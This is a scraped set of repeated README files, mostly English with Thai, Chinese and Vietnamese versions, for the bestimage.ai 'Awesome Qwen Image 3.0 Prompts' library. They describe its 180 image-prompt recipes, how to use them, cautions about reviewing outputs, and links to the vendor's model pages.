readme: # Awesome Qwen Image 3.0 Prompts A practical image-prompt library curated and maintained by the [bestimage.ai](https://bestimage.ai/) team. Start with a concrete deliverable: a product photograph, a multilingual poster, a teaching diagram, a character sheet or a controlled image edit. [![License: MIT](https://img.shields.io/badge/license-MIT-4C52FE.svg)](./LICENSE) [![Recipes: 180](https://img.shields.io/badge/recipes-180-0b7285.svg)](./prompts/README.md) [![Categories: 18](https://img.shields.io/badge/categories-18-7950f2.svg)](./prompts/README.md) [![Languages: 15](https://img.shields.io/badge/languages-15-2f9e44.svg)](./docs/translation-maintenance.md) [English](./README.md) · [简体中文](./README_zh.md) · [繁體中文](./README_tw.md) · [日本語](./README_ja.md) · [한국어](./README_ko.md) · [Español](./README_es.md) · [Français](./README_fr.md) · [Deutsch](./README_de.md) · [Português](./README_pt.md) · [Italiano](./README_it.md) · [Русский](./README_ru.md) · [العربية](./README_ar.md) · [ไทย](./README_th.md) · [Bahasa Indonesia](./README_id.md) · [Tiếng Việt](./README_vi.md) ![Qwen Image 3.0 prompt-library editorial cover](./assets/hero-qwen-image-3-prompts.png) The cover and examples are newly generated illustrations made with the built-in ImageGen tool, **not Qwen test outputs**. See the [exact prompts and production notes](./assets/README.md). ## What's inside - 180 distinct recipes across 18 categories, with ten recipes per category. - 15 language editions of the README, prompt index and full recipe text: 270 category files and 2,700 language-specific recipe instances, not 2,700 independent ideas. - 19 new display images: one cover, six core examples and twelve localized versions of the repair-workshop recipe. - 16 reusable [production templates](./templates/README.md), a [use-case matrix](./docs/use-case-matrix.md) and detailed guidance on [prompt structure](./docs/qwen-image-3-prompt-guide.md) and [multilingual typography](./docs/multilingual-prompting.md). These shared guides are maintained in Chinese. Recipes specify subjects, layout, exact copy, reference-image roles and important constraints as needed. A bracketed input is something you must supply, not permission for a model to invent facts. ## Start with a recipe 1. [Choose a category](./prompts/README.md), then replace every bracketed input with approved material. 2. For editing, upload the authorized references in the stated order and identify what must remain unchanged. 3. Copy the complete prompt. Keep explicitly multilingual strings intact; ordinary localized editions already contain translated copy. 4. Review text, counts, object geometry and layout at full size and at the intended display size. Revise one problem at a time. For data, science, history, safety or medical communication, supply reviewed evidence and obtain qualified review. Generated diagrams and documents are not validated instructions, official records or editable production files. ## Why Qwen Image 3.0 Qwen's [official announcement](https://qwen.ai/blog?id=qwen-image-3.0) emphasizes long instructions, detailed typography, multilingual text and complex layouts. These are useful directions for posters, editorial pages, storyboards and interface concepts—not guarantees that every output is correct. Repository language coverage is not a claim that the model supports exactly those fifteen languages. The recipes describe visual intent. Actual input modes, reference limits, sizes and availability depend on the service and model variant you select. Do not treat a requested aspect ratio or a transparent-looking background as proof of API support. ## Use bestimage.ai The bestimage.ai team maintains this collection alongside its image and video generation platform. - [Qwen Image 3.0 Pro API and model entry](https://bestimage.ai/models/alibaba/qwen-image-3-0-pro/): explore the Qwen workflow relevant to this library and check the available variant before using a prompt. - [GPT Image 2 API and model entry](https://bestimage.ai/models/openai/gpt-image-2/): a separate OpenAI image-generation and editing workflow for related visual tasks. It is not Qwen and is not the same model endpoint. Follow the selected service's current documentation for credentials, request details and pricing. ## Examples you can inspect | Multilingual poster | Product photograph | Educational diagram | | --- | --- | --- | | ![Chinese, English and Japanese river reading festival poster](./assets/gallery/river-reading-festival.png) | ![Yellow modular lamp with exact label and headline](./assets/gallery/modular-desk-lamp.png) | ![Roof-to-storage rainwater illustration with labeled stages](./assets/gallery/rainwater-infographic.png) | | [MKT-02](./prompts/01-brand-social-marketing.md#mkt-02) | [COM-01](./prompts/02-ecommerce-product-food.md#com-01) | [EDU-01](./prompts/03-infographic-education-business.md#edu-01) | | Four-panel story | Interface concept | Bilingual menu | | --- | --- | --- | | ![Mira returns a yellow book in four consistent panels](./assets/gallery/mira-library-storyboard.png) | ![Three static mobile screens for a fictional tool library](./assets/gallery/tool-library-ui.png) | ![Three noodle dishes with Chinese and English labels](./assets/gallery/bilingual-noodle-menu.png) | | [ART-01](./prompts/04-portrait-character-storytelling.md#art-01) | [DIG-01](./prompts/05-ui-game-editing-multilingual.md#dig-01) | [COM-07](./prompts/02-ecommerce-product-food.md#com-07) | These shared examples use their linked canonical prompts; they are not automatically translated when you switch README languages. Localized repair-workshop examples are paired with their exact local prompt in the [language indexes](./prompts/README.md). ## Browse all categories | Category | Recipes | | --- | ---: | | [Brand, posters, and campaigns](./prompts/01-brand-social-marketing.md) | 10 | | [E-commerce, products, and food](./prompts/02-ecommerce-product-food.md) | 10 | | [Infographics, education, and business](./prompts/03-infographic-education-business.md) | 10 | | [Characters, portraits, and storyboards](./prompts/04-portrait-character-storytelling.md) | 10 | | [Interfaces, controlled edits, and localization](./prompts/05-ui-game-editing-multilingual.md) | 10 | | [Avatars, teams, and everyday portraits](./prompts/06-profile-avatar-people.md) | 10 | | [Social posts, covers, and creator content](./prompts/07-social-media-content.md) | 10 | | [Architecture, interiors, and property concepts](./prompts/08-architecture-interior-realestate.md) | 10 | | [Fashion, beauty, and textile concepts](./prompts/09-fashion-beauty-lookbook.md) | 10 | | [Travel, landscapes, cities, and vehicles](./prompts/10-travel-landscape-city-vehicle.md) | 10 | | [Animals, creatures, and botanical studies](./prompts/11-animal-creature-botanical.md) | 10 | | [Typography, editorial design, and patterns](./prompts/12-typography-logo-editorial-background.md) | 10 | | [Game assets, equipment, and industrial concepts](./prompts/13-game-assets-industrial-concepts.md) | 10 | | [Photography and cinematic realism](./prompts/14-photography-cinematic-realism.md) | 10 | | [Illustration and material experiments](./prompts/15-illustration-material-experiments.md) | 10 | | [Documents, publishing, and information design](./prompts/16-documents-publishing-information.md) | 10 | | [History, culture, and evidence-led interpretation](./prompts/17-history-culture-heritage.md) | 10 | | [Science, technical diagrams, and explainers](./prompts/18-science-technical-knowledge.md) | 10 | ## พรอมป์ต์ต่างกัน 180 รายการใน 18 หมวด หมวดละสิบรายการ - README สารบัญ และเนื้อหาพรอมป์ต์ครบถ้วน 15 ภาษา รวมไฟล์หมวด 270 ไฟล์ และพรอมป์ต์ฉบับภาษา 2,700 รายการ ไม่ใช่แนวคิดอิสระ 2,700 แนวคิด - ภาพแสดงใหม่ 19 ภาพ: ปกหนึ่ง ตัวอย่างหลักหก และฉบับภาษาท้องถิ่นของเวิร์กช็อปซ่อมของสิบสองภาพ - [แม่แบบผลิตงาน](./templates/README.md) ใช้ซ้ำได้ 16 แบบ [ตารางกรณีใช้งาน](./docs/use-case-matrix.md) และคู่มือละเอียดเรื่อง [โครงสร้างพรอมป์ต์](./docs/qwen-image-3-prompt-guide.md) กับ [ตัวอักษรหลายภาษา](./docs/multilingual-prompting.md) คู่มือร่วมเหล่านี้ดูแลเป็นภาษาจีน พรอมป์ต์ระบุสิ่งที่แสดง เลย์เอาต์ ข้อความตรง บทบาทภาพอ้างอิง และข้อจำกัดสำคัญตามจำเป็น ข้อมูลในวงเล็บเหลี่ยมคือสิ่งที่คุณต้องให้ ไม่ใช่สิทธิ์ให้โมเดลแต่งข้อเท็จจริง ## เริ่มจากพรอมป์ต์หนึ่งรายการ 1. [เลือกหมวด](./prompts/README_th.md) แล้วแทนข้อมูลในวงเล็บทุกจุดด้วยเนื้อหาที่อนุมัติ 2. ถ้าจะแก้ภาพ ให้อัปโหลดภาพที่ได้รับอนุญาตตามลำดับและระบุส่วนที่ต้องคงเดิม 3. คัดลอกพรอมป์ต์ครบทั้งหมด คงข้อความที่ตั้งใจหลายภาษาไว้ ฉบับท้องถิ่นทั่วไปมีคำแปลแล้ว 4. ตรวจคำ จำนวน รูปทรงวัตถุ และเลย์เอาต์ทั้งขนาดเต็มและขนาดแสดงจริง แก้ทีละปัญหา สำหรับข้อมูล วิทยาศาสตร์ ประวัติศาสตร์ ความปลอดภัย หรือการสื่อสารแพทย์ ให้หลักฐานที่ตรวจแล้วและขอผู้มีคุณสมบัติตรวจ แผนภาพและเอกสารที่สร้างไม่ใช่คำแนะนำที่รับรอง บันทึกทางการ หรือไฟล์ผลิตงานที่แก้ไขได้ ## ทำไมจึงใช้ Qwen Image 3.0 [ประกาศทางการของ Qwen](https://qwen.ai/blog?id=qwen-image-3.0) เน้นคำสั่งยาว ตัวอักษรละเอียด ข้อความหลายภาษา และเลย์เอาต์ซับซ้อน สิ่งเหล่านี้เหมาะเป็นแนวทางสำหรับโปสเตอร์ หน้าบรรณาธิการ สตอรีบอร์ด และแนวคิดอินเทอร์เฟซ ไม่ได้รับประกันว่าทุกผลถูกต้อง จำนวนภาษาของคลังไม่ได้อ้างว่าโมเดลรองรับเฉพาะสิบห้าภาษานี้ พรอมป์ต์อธิบายเจตนาภาพ รูปแบบข้อมูลเข้า ข้อจำกัดภาพอ้างอิง ขนาด และความพร้อมจริงขึ้นกับบริการและรุ่นโมเดลที่เลือก อย่าถือว่าอัตราส่วนที่ขอหรือพื้นหลังดูโปร่งใสเป็นหลักฐานว่า API รองรับ ## ใช้ bestimage.ai ทีม bestimage.ai ดูแลคลังนี้ควบคู่แพลตฟอร์มสร้างภาพและวิดีโอของทีม - [Qwen Image 3.0 Pro API และหน้าโมเดล](https://bestimage.ai/th/models/alibaba/qwen-image-3-0-pro/): ศึกษาขั้นตอน Qwen ที่เกี่ยวกับคลังนี้และตรวจรุ่นที่มีให้ก่อนใช้พรอมป์ต์ - [GPT Image 2 API และหน้าโมเดล](https://bestimage.ai/th/models/openai/gpt-image-2/): ขั้นตอนสร้างและแก้ภาพ OpenAI แยกต่างหากสำหรับงานภาพที่เกี่ยวข้อง ไม่ใช่ Qwen และไม่ใช่ปลายทางโมเดลเดียวกัน โปรดดูข้อมูลรับรอง รายละเอียดคำขอ และราคาจากเอกสารปัจจุบันของบริการที่เลือก ## See the [exact prompts and production notes](./assets/README.md). ## What's inside - 180 distinct recipes across 18 categories, with ten recipes per category. - 15 language editions of the README, prompt index and full recipe text: 270 category files and 2,700 language-specific recipe instances, not 2,700 independent ideas. - 19 new display images: one cover, six core examples and twelve localized versions of the repair-workshop recipe. - 16 reusable [production templates](./templates/README.md), a [use-case matrix](./docs/use-case-matrix.md) and detailed guidance on [prompt structure](./docs/qwen-image-3-prompt-guide.md) and [multilingual typography](./docs/multilingual-prompting.md). These shared guides are maintained in Chinese. Recipes specify subjects, layout, exact copy, reference-image roles and important constraints as needed. A bracketed input is something you must supply, not permission for a model to invent facts. ## Start with a recipe 1. [Choose a category](./prompts/README.md), then replace every bracketed input with approved material. 2. For editing, upload the authorized references in the stated order and identify what must remain unchanged. 3. Copy the complete prompt. Keep explicitly multilingual strings intact; ordinary localized editions already contain translated copy. 4. Review text, counts, object geometry and layout at full size and at the intended display size. Revise one problem at a time. For data, science, history, safety or medical communication, supply reviewed evidence and obtain qualified review. Generated diagrams and documents are not validated instructions, official records or editable production files. ## Why Qwen Image 3.0 Qwen's [official announcement](https://qwen.ai/blog?id=qwen-image-3.0) emphasizes long instructions, detailed typography, multilingual text and complex layouts. These are useful directions for posters, editorial pages, storyboards and interface concepts—not guarantees that every output is correct. Repository language coverage is not a claim that the model supports exactly those fifteen languages. The recipes describe visual intent. Actual input modes, reference limits, sizes and availability depend on the service and model variant you select. Do not treat a requested aspect ratio or a transparent-looking background as proof of API support. ## Use bestimage.ai The bestimage.ai team maintains this collection alongside its image and video generation platform. - [Qwen Image 3.0 Pro API and model entry](https://bestimage.ai/models/alibaba/qwen-image-3-0-pro/): explore the Qwen workflow relevant to this library and check the available variant before using a prompt. - [GPT Image 2 API and model entry](https://bestimage.ai/models/openai/gpt-image-2/): a separate OpenAI image-generation and editing workflow for related visual tasks. It is not Qwen and is not the same model endpoint. raw.text: # Awesome Qwen Image 3.0 提示詞 由 [bestimage.ai](https://bestimage.ai/) 團隊整理和維護的實用圖像提示詞庫。從具體產物出發：產品照片、多語言海報、教學圖解、角色設定表，或範圍明確的圖像編輯。 [![授權：MIT](https://img.shields.io/badge/license-MIT-4C52FE.svg)](./LICENSE) [![配方：180](https://img.shields.io/badge/recipes-180-0b7285.svg)](./prompts/README_tw.md) [![分類：18](https://img.shields.io/badge/categories-18-7950f2.svg)](./prompts/README_tw.md) [![語言：15](https://img.shields.io/badge/languages-15-2f9e44.svg)](./docs/translation-maintenance.md) [English](./README.md) · [简体中文](./README_zh.md) · [繁體中文](./README_tw.md) · [日本語](./README_ja.md) · [한국어](./README_ko.md) · [Español](./README_es.md) · [Français](./README_fr.md) · [Deutsch](./README_de.md) · [Português](./README_pt.md) · [Italiano](./README_it.md) · [Русский](./README_ru.md) · [العربية](./README_ar.md) · [ไทย](./README_th.md) · [Bahasa Indonesia](./README_id.md) · [Tiếng Việt](./README_vi.md) ![Qwen Image 3.0 提示詞庫編輯風格封面](./assets/hero-qwen-image-3-prompts.png) 封面和案例均為使用內建 ImageGen 工具新生成的插圖，**不是 Qwen 實測輸出**。詳見[實際提示詞與製作說明](./assets/README.md)。 ## 庫中內容 - 18 個分類、180 條不同配方，每類十條。 - README、提示詞索引和完整配方正文均有 15 種語言版本：共 270 個分類檔案、2,700 條語言版本，而不是 2,700 個獨立創意。 - 19 張新展示圖：一張封面、六張核心案例、十二張維修工坊配方的在地化圖片。 - 16 個可重複使用的[製作範本](./templates/README.md)，以及[情境矩陣](./docs/use-case-matrix.md)、[提示詞結構指南](./docs/qwen-image-3-prompt-guide.md)和[多語言排版指南](./docs/multilingual-prompting.md)。這些共用指南以中文維護。 配方按實際需要說明主體、版面、精確文案、參考圖角色和重要約束。方括號輸入項是需要你提供的材料，不是允許模型編造事實。 ## 從一條配方開始 1. [選擇分類](./prompts/README_tw.md)，將所有方括號輸入項替換為已獲准使用的材料。 2. 編輯圖像時，按指定順序上傳獲授權的參考圖，並說明哪些部分必須保持不變。 3. 複製完整提示詞。明確要求多語言的字串應保持原樣；一般在地化版本已包含翻譯後的畫面文案。 4. 分別按原圖尺寸和實際展示尺寸檢查文字、數量、物件結構和版面，每次針對一個問題修正。 涉及資料、科學、歷史、安全或醫療傳播時，請提供經過審核的證據並請適當的專業人員複核。生成的圖解和文件不是經過驗證的操作說明、正式紀錄或可編輯的製作檔案。 ## 為什麼圍繞 Qwen Image 3.0 設計 Qwen 的[官方公告](https://qwen.ai/blog?id=qwen-image-3.0)強調長指令、精細文字排版、多語言文字和複雜版面。這些方向適合海報、編輯頁面、分鏡與介面概念，但不保證每次輸出都正確。提示詞庫提供十五種語言，不代表模型恰好支援這十五種語言。 配方描述的是視覺意圖。實際輸入模式、參考圖限制、尺寸和可用性取決於所選服務及模型版本。提示詞要求某個長寬比或看似透明的背景，並不能證明 API 支援相應功能。 ## 使用 bestimage.ai bestimage.ai 團隊在提供圖像與影片生成平台的同時維護本提示詞庫。 - [Qwen Image 3.0 Pro API 與模型入口](https://bestimage.ai/tw/models/alibaba/qwen-image-3-0-pro/)：了解與本庫相關的 Qwen 工作流程，使用提示詞前核對可選模型版本。 - [GPT Image 2 API 與模型入口](https://bestimage.ai/tw/models/openai/gpt-image-2/)：用於相關視覺任務的獨立 OpenAI 圖像生成與編輯工作流程。它不是 Qwen，也不是同一個模型端點。 憑證、請求細節和價格請以所選服務的現行文件為準。 ## readme: # Awesome Qwen Image 3.0 Prompts A practical image-prompt library curated and maintained by the [bestimage.ai](https://bestimage.ai/) team. Start with a concrete deliverable: a product photograph, a multilingual poster, a teaching diagram, a character sheet or a controlled image edit. [![License: MIT](https://img.shields.io/badge/license-MIT-4C52FE.svg)](./LICENSE) [![Recipes: 180](https://img.shields.io/badge/recipes-180-0b7285.svg)](./prompts/README.md) [![Categories: 18](https://img.shields.io/badge/categories-18-7950f2.svg)](./prompts/README.md) [![Languages: 15](https://img.shields.io/badge/languages-15-2f9e44.svg)](./docs/translation-maintenance.md) [English](./README.md) · [简体中文](./README_zh.md) · [繁體中文](./README_tw.md) · [日本語](./README_ja.md) · [한국어](./README_ko.md) · [Español](./README_es.md) · [Français](./README_fr.md) · [Deutsch](./README_de.md) · [Português](./README_pt.md) · [Italiano](./README_it.md) · [Русский](./README_ru.md) · [العربية](./README_ar.md) · [ไทย](./README_th.md) · [Bahasa Indonesia](./README_id.md) · [Tiếng Việt](./README_vi.md) ![Qwen Image 3.0 prompt-library editorial cover](./assets/hero-qwen-image-3-prompts.png) The cover and examples are newly generated illustrations made with the built-in ImageGen tool, **not Qwen test outputs**. See the [exact prompts and production notes](./assets/README.md). ## What's inside - 180 distinct recipes across 18 categories, with ten recipes per category. - 15 language editions of the README, prompt index and full recipe text: 270 category files and 2,700 language-specific recipe instances, not 2,700 independent ideas. - 19 new display images: one cover, six core examples and twelve localized versions of the repair-workshop recipe. - 16 reusable [production templates](./templates/README.md), a [use-case matrix](./docs/use-case-matrix.md) and detailed guidance on [prompt structure](./docs/qwen-image-3-prompt-guide.md) and [multilingual typography](./docs/multilingual-prompting.md). These shared guides are maintained in Chinese. Recipes specify subjects, layout, exact copy, reference-image roles and important constraints as needed. A bracketed input is something you must supply, not permission for a model to invent facts. ## Start with a recipe 1. [Choose a category](./prompts/README.md), then replace every bracketed input with approved material. 2. For editing, upload the authorized references in the stated order and identify what must remain unchanged. 3. Copy the complete prompt. Keep explicitly multilingual strings intact; ordinary localized editions already contain translated copy. 4. Review text, counts, object geometry and layout at full size and at the intended display size. Revise one problem at a time. For data, science, history, safety or medical communication, supply reviewed evidence and obtain qualified review. Generated diagrams and documents are not validated instructions, official records or editable production files. ## Why Qwen Image 3.0 Qwen's [official announcement](https://qwen.ai/blog?id=qwen-image-3.0) emphasizes long instructions, detailed typography, multilingual text and complex layouts. These are useful directions for posters, editorial pages, storyboards and interface concepts—not guarantees that every output is correct. Repository language coverage is not a claim that the model supports exactly those fifteen languages. The recipes describe visual intent. Actual input modes, reference limits, sizes and availability depend on the service and model variant you select. Do not treat a requested aspect ratio or a transparent-looking background as proof of API support. ## Use bestimage.ai The bestimage.ai team maintains this collection alongside its image and video generation platform. - [Qwen Image 3.0 Pro API and model entry](https://bestimage.ai/models/alibaba/qwen-image-3-0-pro/): explore the Qwen workflow relevant to this library and check the available variant before using a prompt. - [GPT Image 2 API and model entry](https://bestimage.ai/models/openai/gpt-image-2/): a separate OpenAI image-generation and editing workflow for related visual tasks. It is not Qwen and is not the same model endpoint. Follow the selected service's current documentation for credentials, request details and pricing. ## Examples you can inspect | Multilingual poster | Product photograph | Educational diagram | | --- | --- | --- | | ![Chinese, English and Japanese river reading festival poster](./assets/gallery/river-reading-festival.png) | ![Yellow modular lamp with exact label and headline](./assets/gallery/modular-desk-lamp.png) | ![Roof-to-storage rainwater illustration with labeled stages](./assets/gallery/rainwater-infographic.png) | | [MKT-02](./prompts/01-brand-social-marketing.md#mkt-02) | [COM-01](./prompts/02-ecommerce-product-food.md#com-01) | [EDU-01](./prompts/03-infographic-education-business.md#edu-01) | | Four-panel story | Interface concept | Bilingual menu | | --- | --- | --- | | ![Mira returns a yellow book in four consistent panels](./assets/gallery/mira-library-storyboard.png) | ![Three static mobile screens for a fictional tool library](./assets/gallery/tool-library-ui.png) | ![Three noodle dishes with Chinese and English labels](./assets/gallery/bilingual-noodle-menu.png) | | [ART-01](./prompts/04-portrait-character-storytelling.md#art-01) | [DIG-01](./prompts/05-ui-game-editing-multilingual.md#dig-01) | [COM-07](./prompts/02-ecommerce-product-food.md#com-07) | These shared examples use their linked canonical prompts; they are not automatically translated when you switch README languages. Localized repair-workshop examples are paired with their exact local prompt in the [language indexes](./prompts/README.md). ## Browse all categories | Category | Recipes | | --- | ---: | | [Brand, posters, and campaigns](./prompts/01-brand-social-marketing.md) | 10 | | [E-commerce, products, and food](./prompts/02-ecommerce-product-food.md) | 10 | | [Infographics, education, and business](./prompts/03-infographic-education-business.md) | 10 | | [Characters, portraits, and storyboards](./prompts/04-portrait-character-storytelling.md) | 10 | | [Interfaces, controlled edits, and localization](./prompts/05-ui-game-editing-multilingual.md) | 10 | | [Avatars, teams, and everyday portraits](./prompts/06-profile-avatar-people.md) | 10 | | [Social posts, covers, and creator content](./prompts/07-social-media-content.md) | 10 | | [Architecture, interiors, and property concepts](./prompts/08-architecture-interior-realestate.md) | 10 | | [Fashion, beauty, and textile concepts](./prompts/09-fashion-beauty-lookbook.md) | 10 | | [Travel, landscapes, cities, and vehicles](./prompts/10-travel-landscape-city-vehicle.md) | 10 | | [Animals, creatures, and botanical studies](./prompts/11-animal-creature-botanical.md) | 10 | | [Typography, editorial design, and patterns](./prompts/12-typography-logo-editorial-background.md) | 10 | | [Game assets, equipment, and industrial concepts](./prompts/13-game-assets-industrial-concepts.md) | 10 | | [Photography and cinematic realism](./prompts/14-photography-cinematic-realism.md) | 10 | | [Illustration and material experiments](./prompts/15-illustration-material-experiments.md) | 10 | | [Documents, publishing, and information design](./prompts/16-documents-publishing-information.md) | 10 | | [History, culture, and evidence-led interpretation](./prompts/17-history-culture-heritage.md) | 10 | | [Science, technical diagrams, and explainers](./prompts/18-science-technical-knowledge.md) | 10 | ## raw.text: # Awesome Qwen Image 3.0 — Thư viện câu lệnh Thư viện câu lệnh hình ảnh thực dụng do đội ngũ [bestimage.ai](https://bestimage.ai/) tuyển chọn và duy trì. Hãy bắt đầu bằng sản phẩm cụ thể: ảnh sản phẩm, áp phích đa ngữ, sơ đồ giảng dạy, tờ nhân vật hoặc chỉnh sửa ảnh có kiểm soát. [![Giấy phép: MIT](https://img.shields.io/badge/license-MIT-4C52FE.svg)](./LICENSE) [![Mẫu: 180](https://img.shields.io/badge/recipes-180-0b7285.svg)](./prompts/README_vi.md) [![Danh mục: 18](https://img.shields.io/badge/categories-18-7950f2.svg)](./prompts/README_vi.md) [![Ngôn ngữ: 15](https://img.shields.io/badge/languages-15-2f9e44.svg)](./docs/translation-maintenance.md) [English](./README.md) · [简体中文](./README_zh.md) · [繁體中文](./README_tw.md) · [日本語](./README_ja.md) · [한국어](./README_ko.md) · [Español](./README_es.md) · [Français](./README_fr.md) · [Deutsch](./README_de.md) · [Português](./README_pt.md) · [Italiano](./README_it.md) · [Русский](./README_ru.md) · [العربية](./README_ar.md) · [ไทย](./README_th.md) · [Bahasa Indonesia](./README_id.md) · [Tiếng Việt](./README_vi.md) ![Ảnh bìa biên tập thư viện câu lệnh Qwen Image 3.0](./assets/hero-qwen-image-3-prompts.png) Ảnh bìa và ví dụ là minh họa mới tạo bằng công cụ ImageGen tích hợp, **không phải đầu ra thử nghiệm Qwen**. Xem [câu lệnh chính xác và ghi chú sản xuất](./assets/README.md). ## Nội dung thư viện - 180 mẫu khác nhau trong 18 danh mục, mỗi danh mục mười mẫu. - 15 bản ngôn ngữ của README, mục lục và toàn văn mẫu: 270 tệp danh mục, 2.700 phiên bản mẫu theo ngôn ngữ, không phải 2.700 ý tưởng độc lập. - 19 ảnh trình bày mới: một bìa, sáu ví dụ chính và mười hai bản địa hóa của mẫu buổi sửa đồ. - 16 [mẫu sản xuất](./templates/README.md) tái sử dụng, [ma trận tình huống](./docs/use-case-matrix.md), hướng dẫn chi tiết về [cấu trúc câu lệnh](./docs/qwen-image-3-prompt-guide.md) và [kiểu chữ đa ngữ](./docs/multilingual-prompting.md). Các hướng dẫn dùng chung này được duy trì bằng tiếng Trung. Mẫu quy định chủ thể, bố cục, chữ chính xác, vai trò ảnh tham chiếu và ràng buộc quan trọng tùy nhu cầu. Đầu vào trong ngoặc vuông là thông tin bạn phải cấp, không phải cho phép mô hình bịa sự thật. ## Bắt đầu từ một mẫu 1. [Chọn danh mục](./prompts/README_vi.md), rồi thay mọi đầu vào ngoặc vuông bằng tư liệu đã duyệt. 2. Khi chỉnh sửa, tải ảnh được phép theo thứ tự nêu và chỉ rõ phần phải giữ nguyên. 3. Sao chép câu lệnh đầy đủ. Giữ nguyên chuỗi được quy định đa ngữ; bản địa hóa thông thường đã có chữ được dịch. 4. Kiểm tra chữ, số lượng, hình học đồ vật, bố cục ở kích thước đầy đủ và kích thước hiển thị dự kiến. Mỗi lần sửa một vấn đề. Với truyền thông dữ liệu, khoa học, lịch sử, an toàn hoặc y tế, hãy cung cấp bằng chứng đã duyệt và có người đủ chuyên môn kiểm tra. Sơ đồ và tài liệu tạo sinh không phải hướng dẫn đã xác nhận, hồ sơ chính thức hay tệp sản xuất chỉnh sửa được. ## Vì sao chọn Qwen Image 3.0 [Thông báo chính thức của Qwen](https://qwen.ai/blog?id=qwen-image-3.0) nhấn mạnh chỉ dẫn dài, kiểu chữ chi tiết, nội dung đa ngữ và bố cục phức tạp. Đây là hướng hữu ích cho áp phích, trang biên tập, bảng phân cảnh, ý tưởng giao diện—không đảm bảo mọi kết quả đều đúng. readme: # Awesome Qwen Image 3.0 Prompts A practical image-prompt library curated and maintained by the [bestimage.ai](https://bestimage.ai/) team. Start with a concrete deliverable: a product photograph, a multilingual poster, a teaching diagram, a character sheet or a controlled image edit. [![License: MIT](https://img.shields.io/badge/license-MIT-4C52FE.svg)](./LICENSE) [![Recipes: 180](https://img.shields.io/badge/recipes-180-0b7285.svg)](./prompts/README.md) [![Categories: 18](https://img.shields.io/badge/categories-18-7950f2.svg)](./prompts/README.md) [![Languages: 15](https://img.shields.io/badge/languages-15-2f9e44.svg)](./docs/translation-maintenance.md) [English](./README.md) · [简体中文](./README_zh.md) · [繁體中文](./README_tw.md) · [日本語](./README_ja.md) · [한국어](./README_ko.md) · [Español](./README_es.md) · [Français](./README_fr.md) · [Deutsch](./README_de.md) · [Português](./README_pt.md) · [Italiano](./README_it.md) · [Русский](./README_ru.md) · [العربية](./README_ar.md) · [ไทย](./README_th.md) · [Bahasa Indonesia](./README_id.md) · [Tiếng Việt](./README_vi.md) ![Qwen Image 3.0 prompt-library editorial cover](./assets/hero-qwen-image-3-prompts.png) The cover and examples are newly generated illustrations made with the built-in ImageGen tool, **not Qwen test outputs**. See the [exact prompts and production notes](./assets/README.md). ## What's inside - 180 distinct recipes across 18 categories, with ten recipes per category. - 15 language editions of the README, prompt index and full recipe text: 270 category files and 2,700 language-specific recipe instances, not 2,700 independent ideas. - 19 new display images: one cover, six core examples and twelve localized versions of the repair-workshop recipe. - 16 reusable [production templates](./templates/README.md), a [use-case matrix](./docs/use-case-matrix.md) and detailed guidance on [prompt structure](./docs/qwen-image-3-prompt-guide.md) and [multilingual typography](./docs/multilingual-prompting.md). These shared guides are maintained in Chinese. Recipes specify subjects, layout, exact copy, reference-image roles and important constraints as needed. A bracketed input is something you must supply, not permission for a model to invent facts. ## Start with a recipe 1. [Choose a category](./prompts/README.md), then replace every bracketed input with approved material. 2. For editing, upload the authorized references in the stated order and identify what must remain unchanged. 3. Copy the complete prompt. Keep explicitly multilingual strings intact; ordinary localized editions already contain translated copy. 4. Review text, counts, object geometry and layout at full size and at the intended display size. Revise one problem at a time. For data, science, history, safety or medical communication, supply reviewed evidence and obtain qualified review. Generated diagrams and documents are not validated instructions, official records or editable production files. ## Why Qwen Image 3.0 Qwen's [official announcement](https://qwen.ai/blog?id=qwen-image-3.0) emphasizes long instructions, detailed typography, multilingual text and complex layouts. These are useful directions for posters, editorial pages, storyboards and interface concepts—not guarantees that every output is correct. Repository language coverage is not a claim that the model supports exactly those fifteen languages. The recipes describe visual intent. Actual input modes, reference limits, sizes and availability depend on the service and model variant you select. Do not treat a requested aspect ratio or a transparent-looking background as proof of API support. ## Use bestimage.ai The bestimage.ai team maintains this collection alongside its image and video generation platform. - [Qwen Image 3.0 Pro API and model entry](https://bestimage.ai/models/alibaba/qwen-image-3-0-pro/): explore the Qwen workflow relevant to this library and check the available variant before using a prompt. - [GPT Image 2 API and model entry](https://bestimage.ai/models/openai/gpt-image-2/): a separate OpenAI image-generation and editing workflow for related visual tasks. It is not Qwen and is not the same model endpoint. Follow the selected service's current documentation for credentials, request details and pricing. ## Examples you can inspect | Multilingual poster | Product photograph | Educational diagram | | --- | --- | --- | | ![Chinese, English and Japanese river reading festival poster](./assets/gallery/river-reading-festival.png) | ![Yellow modular lamp with exact label and headline](./assets/gallery/modular-desk-lamp.png) | ![Roof-to-storage rainwater illustration with labeled stages](./assets/gallery/rainwater-infographic.png) | | [MKT-02](./prompts/01-brand-social-marketing.md#mkt-02) | [COM-01](./prompts/02-ecommerce-product-food.md#com-01) | [EDU-01](./prompts/03-infographic-education-business.md#edu-01) | | Four-panel story | Interface concept | Bilingual menu | | --- | --- | --- | | ![Mira returns a yellow book in four consistent panels](./assets/gallery/mira-library-storyboard.png) | ![Three static mobile screens for a fictional tool library](./assets/gallery/tool-library-ui.png) | ![Three noodle dishes with Chinese and English labels](./assets/gallery/bilingual-noodle-menu.png) | | [ART-01](./prompts/04-portrait-character-storytelling.md#art-01) | [DIG-01](./prompts/05-ui-game-editing-multilingual.md#dig-01) | [COM-07](./prompts/02-ecommerce-product-food.md#com-07) | These shared examples use their linked canonical prompts; they are not automatically translated when you switch README languages. raw.text: # Awesome Qwen Image 3.0 提示词 由 [bestimage.ai](https://bestimage.ai/) 团队整理和维护的实用图像提示词库。从具体产物出发：产品照片、多语言海报、教学图解、角色设定表，或范围明确的图像编辑。 [![许可：MIT](https://img.shields.io/badge/license-MIT-4C52FE.svg)](./LICENSE) [![配方：180](https://img.shields.io/badge/recipes-180-0b7285.svg)](./prompts/README_zh.md) [![分类：18](https://img.shields.io/badge/categories-18-7950f2.svg)](./prompts/README_zh.md) [![语言：15](https://img.shields.io/badge/languages-15-2f9e44.svg)](./docs/translation-maintenance.md) [English](./README.md) · [简体中文](./README_zh.md) · [繁體中文](./README_tw.md) · [日本語](./README_ja.md) · [한국어](./README_ko.md) · [Español](./README_es.md) · [Français](./README_fr.md) · [Deutsch](./README_de.md) · [Português](./README_pt.md) · [Italiano](./README_it.md) · [Русский](./README_ru.md) · [العربية](./README_ar.md) · [ไทย](./README_th.md) · [Bahasa Indonesia](./README_id.md) · [Tiếng Việt](./README_vi.md) ![Qwen Image 3.0 提示词库编辑风格封面](./assets/hero-qwen-image-3-prompts.png) 